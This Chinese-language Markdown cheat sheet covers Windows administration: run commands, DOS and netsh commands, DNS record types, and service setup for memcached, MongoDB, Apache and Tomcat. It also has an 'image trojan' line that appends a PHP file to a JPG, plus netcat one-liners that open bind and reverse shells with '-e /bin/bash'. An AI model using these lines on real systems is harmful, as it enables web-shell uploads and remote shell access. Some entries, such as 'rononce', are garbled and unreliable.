## Windows 快捷操作（以Win7为准）
```
[command] /?  命令帮助 
Win+R 运行
msconfig 系统配置
mmc 控制台
comexp.msc 组件服务
gpedit.msc 本地组策略编辑器
secpol.msc 本地安全策略设置
rsop.msc 各种策略的结果集
perfmon.msc 性能监视器
wmimgmt.msc WMI控件
devmgmt.msc 设备管理器
diskmgmt.msc 磁盘管理
compmgmt.msc 计算机管理
certmgr.msc 证书管理
fsmgmt.msc 共享文件夹
eventvwr.msc 事件查看器
lusrmgr.msc 本地用户和组
services.msc 本地服务
```

### 启动Windows自带应用
```
write 写字板
notepad 记事本
mspaint 画图
snipping tool 截图
mstsc 远程桌面连接
control 控制面板
explorer 资源管理器
mplayer2 播放器
wmplayer
dvdplay
osk 屏幕键盘
calc 计算器
mobsync 同步中心
magnify 放大镜
wiaacmgr 扫描仪和照相机向导
eudcedit 造字程序
wscript 脚本宿主设置
winver 检查系统版本
dxdiag 检查directx信息
charmap 字符映射表
cliconfg SQL客户网络工具

cleanmgr 清理磁盘
taskmgr 任务管理器
sigverif.exe  文件签名验证器
sysedit 系统配置编辑器
shrpubw 创建共享文件夹
syskey 系统加密
regedit 注册表
iexpress 压缩工具
narrator 语音讲述
odbcad32 数据源管理
utilman 轻松访问
verifier.exe 驱动验证管理器
```

### 功能快捷键
```
F1 帮助
F2 重命名
F3 搜索
F5 刷新
F11 全屏
F12 页面源代码
开机时
F2 BIOS
del
F8 安全模式
```


### 网络命令
```
arp IP到mac地址对应列表
ipconfig 查看ip配置
net start/stop serv_name 启动/停止服务
net config workstation/server

netsh -c interface ip dump > file_dir; 导出配置脚本
netsh -f file_dir; 导入配置脚本
netsh interface ip show {option} 查看网络配置
netsh interface ip set address " " static ip_addr subnet_mask gateway n 配置接口IP/网关IP
netsh interface ip set address/dns/wins " " dhcp 开启dhcp服务
netsh interface ip set address/dns/wins " " ip_addr 配置静态ip
netsh -c interface dump 查看网络配置文件
netsh wlan set hostednetwork mode=allow|disallow ssid=xxx key=xxx
netsh wlan start|stop hostednetwork

netstat [-a][-e][-n][-o][-p Protocol][-r][-s][-t][interval]  监控tcp/ip网络状态
-a  显示所有socket，包括正在监听的；
-e  显示以太网统计，可与-s结合使用；
-f   显示外部地址的完全限定域名
-o  显示拥有的与每个连接关联的进程ID；
-p protocol   显示指定协议的连接，可以是tcp、udp；
-n  以数字形式显示地址和端口；
-r  显示路由表；
-s  显示每个协议的统计；
-t   显示当前连接卸载状态；

nslookup -qt=A dns 指定查询类型
nslookup set type=mx domain
telnet www.baidu.com 80 远程连接
route 操作网络路由表
ping 分组网间探测
tracert 路由追踪
```

### 关机注销等
```
logoff 注销
shutdown 关机
rononce -p 15 15s关机
shutdown [-i/-l/-s/-r/-a] [-f] [-t xx] [-c "comment"]
-i 显示GUI界面
-l 注销
-s 关机
-r 重启
-a 取消关机
-f 强制关机
-t xx 设置关机倒计时xx秒
-c "comment" 关闭注释
```

### DOS常用命令
```
at 计划列表
at 23:59 shutdown -s 定时关机
at id /del 取消关机计划
append 允许程序打开特定路径下文件
attrib 显示或设置文件属性

cd 改变路径
cd ..上一层路径
cd / 根目录
C: 转到c盘下
cls 清屏
chkdsk 磁盘检查
chkdsk D: /f 检查并修复D盘
convert X: /fs:ntfs [/v] 将X盘由fat格式转为ntfs格式
copy 复制文件
制作图片种子
copy/b 1.jpg/png/gif/jpeg + 1.zip/rar 2.jpg/png/gif/jpeg

dir /p /w 显示当前路径
dir /ah  显示隐藏文件和文件夹
dir dir_name 查看路径信息
del 删除文件
del /f /a 强制删除文件
diskcopy 复制磁盘
diskcomp 比较软盘
defrag 磁盘碎片整理
doskey 调用和建立dos宏命令
debug 检查debug

exe2bin exe转换为bin
expand 解压缩
extrac32 解CAB工具
edit 进入编辑模式

format 格式化磁盘
fc 比较文件
find 查找文件中的文本行
findstr 查找文件中的行字符串
finger 显示一个用户的信息
ftp 文件上传或下载

help cmd_name 查看命令帮助
hostname 显示主机名
label 改变驱动器卷标

more 分屏显示
md 创建目录
makecab 制作CAB文件
mem 显示内存状态
move 移动文件或目录

print 打印
path 为执行文件显示或设置一个搜索路径
prompt 更改命令提示符


query 查询进程
quser 显示用户登录信息

ren 重命名
rd 删除目录
redir 运行重定向服务
recover 恢复信息

services xxx start/stop 运行/停止服务
set 设置、显示或删除环境变量
sfc 系统文件检查器 
sc 描述服务管理器和服务进行通信
sc delete servicename  #从注册表删除系统服务
subst 将路径与驱动器号关联
systeminfo 显示系统信息

tree 显示路径树形结构
type filename 查看文件内容
tasklist 查看任务列表
tasklist /m > 1.txt
taskkill 杀死进程
taskkill /f /t /im [process] #强制杀死进程及其子进程

xcopy 复制目录与文件
```

### 注册表相关
```
regsvr32 /u /s /n /i[:cmdline] dll_name 动态链接库注册
/u 反注册
/s 安静运行
/n 不调用DllRegisterServer。必须与/i共用
/i:cmdline 调用DllInstall将它传递到可选的[cmdline]
```

### 硬盘分区
```
Run→compmgmt.msc→磁盘管理
在“未指派”的磁盘空间上点击右键，选择“新建磁盘分区”命令。在弹出的磁盘分区向导窗口中，选择分区类型为“扩展分区”，点击“下一步”后，输入新建分区的容量大小，接着在此设置分区的磁盘文件格式，并勾选“不格式化”项，最后点击“完成”按钮即可完成分区操作。再打开“我的电脑”，右键点击新建分区，选择“格式化”命令，使用快速格式化方式，即可在一分钟之内，完成分区到格式化的全部操作。
```

### 平台与依赖库
```
windows 软件  主程序+依赖库，一起打包，解决依赖问题。
linux软件   主程序+依赖库，独立的package，通过软件仓库同步。
dll hell   com组件升级导致软件不兼容问题。
```

### dns相关
```
A(Address)记录：指定主机名（域名）对应的IP地址记录。
MX记录：邮件系统根据收信人的地址后缀定位邮件服务器。比如user@domain.com，邮件系统对domain.com进行dns中的mx记录解析。
CNAME记录：别名记录，多个名字映射到同一域名。比如某计算机host.domain.com同时提供www和mail服务，则可以为该计算机设置两个别名www和mail，分别访问两个服务。
PTR记录：指针记录，解析地址到主机名(域名);与A记录对应。用于email发送过程中的反向地址解析。
SPF记录：Sender Policy Framework，即发信者策略架构。是一种TXT类型的记录，用于登记某个域名拥有的用来外发邮件的所有ip地址。
查询A/MX/CNAME/PTR记录的方法：
nslookup
set q=a/mx/cname/ptr
domain.com/220.181.12.13
DNS正向解析：通过查询域名的A记录来获取该域名指向的IP地址。
DNS反向解析：通过查询IP地址的PTR记录来得到该IP地址指向的域名。

正向代理：客户端通过代理服务器来访问目标服务器，代理服务器充当跳板。
反向代理：代理服务器获取目标服务器的内容返回给用户，但该内容在代理服务器的命名空间里，就好像是代理服务器本身的内容一样。
```

### 图片木马

`copy 1.jpg/b+1.php/a 2.jpg`

### netcat for windows
```
nc example.com 80  #相当于telnet
nc -l 1234 -e /bin/bash  #在远程机上创建一个shell
nc remote_machine 1234 #在本机上监听
nc -l 1234  #在本机创建一个反弹shell
nc -e /bin/bash local_machine 1234 #在远程机器上监听
```

### winrar的用法
```
"C:\Program Files\WinRAR\winrar.exe" a -k -r -s -m1 d:\www\tp.zip d:\www\tp\
"C:\Program Files\WinRAR\winrar.exe" a -k -s -m1 d:\www\tp.zip d:\www\mvc.txt

参数说明:
a 添加文件到压缩文件中
-k 锁定压缩文件
-s产生固体存档,这样可以增大压缩比
-r包括子目录
-m1 设置压缩比
       -m0   存储      添加到压缩文件时不压缩文件。
       -m1   最快      使用最快方式(低压缩)
       -m2   较快      使用快速压缩方式
       -m3   标准      使用标准(默认)压缩方式
       -m4   较好      使用较好压缩方式(较好压缩，但是慢)
       -m5   最好      使用最大压缩方式(最好的压缩，但是最慢)
```

### windows memcached
```
memcached.exe  #默认端口11211
memcached.exe -d install  #安装
memcached.exe -d uninstall #卸载
sc delete "memcache Server"  #删除服务
memcached.exe -d start|stop|shutdown  #启动/关闭
memcached.exe -p 10000 -m 512 -d start  #修改端口和内存
telnet localhost 11211
stats  #查看基本信息
stats items  #查看items
get key 
-c 最大同时连接数，默认1024
-f 块大小增长因子，默认1.25
-n 最小分配空间，key+value+flags默认是48
-h 显示帮助  
```
<br/>


### windows mongodb
```
# 安装成windows服务
mongod --dbpath D:\Mongo\data --logpath=D:\Mongo\log\mongodb.log --logappend --install

# 创建配置文件D:\Mongo\etc\mongodb.conf
dbpath=D:\Mongo\data #数据库路径
logpath=D:\Mongo\log\mongodb.log #日志输出文件路径
logappend=true #错误日志采用追加模式，配置这个选项后mongodb的日志会追加到现有的日志文件，而不是从新创建一个新文件
journal=true #启用日志文件，默认启用
quiet=true #这个选项可以过滤掉一些无用的日志信息，若需要调试使用请设置为false
port=27017 #端口号 默认为27017

# 普通启动
mongod --config D:\Mongo\etc\mongodb.conf

# 安装为服务
mongod --config D:\Mongo\etc\mongodb.conf --install

# 启动服务
net start|stop MongoDB

# 数据修复
mongod --auth --dbpath=D:\Mongo\data --repair
```

### 磁盘处于脱机状态怎么办？
```
使用DISKPART.exe命令 解除策略
1.运行：cmd
2.输入：DISKPART.exe
3.DISKPART> san
4.DISKPART> san policy=onlineall
5.DISKPART>list disk
6.DISKPART> select disk 1
7.DISKPART>attributes disk clear readonly
8.DISKPART>online disk
```

### 安装卸载权限不够怎么办？
```
不切换帐号直接在普通域用户登录下安装软件
win7： 按住shift，右键单击安装文件，选择用其他帐号运行，输入密码。 或者，runas /user:administrator 软件路径+名称    如果是MSI文件，则用管理员权限打开CMD，切换到目录运行安装文件。
xp系统：右键，管理员运行。

卸载软件：
打开控制面板，按住shift，然后右击 添加/删除程序  再选 运行方式。
win7如果没有uninstall.exe，则只能切换帐号了。
win7如果关闭了用户控制，不能更改ntfs权限。
```

### apache服务器httpd命令

```
httpd -k install
httpd -k install -n "apache2.4" -f "d:/http.conf"
httpd -k uninstall
httpd -k uninstall -n "apache"
httpd -k start
httpd -k stop
httpd -k restart
```

### tomcat注册为windows服务

`service.bat install tomcat`

`service.bat remove tomcat`

`net start tomcat`

`net stop tomcat`
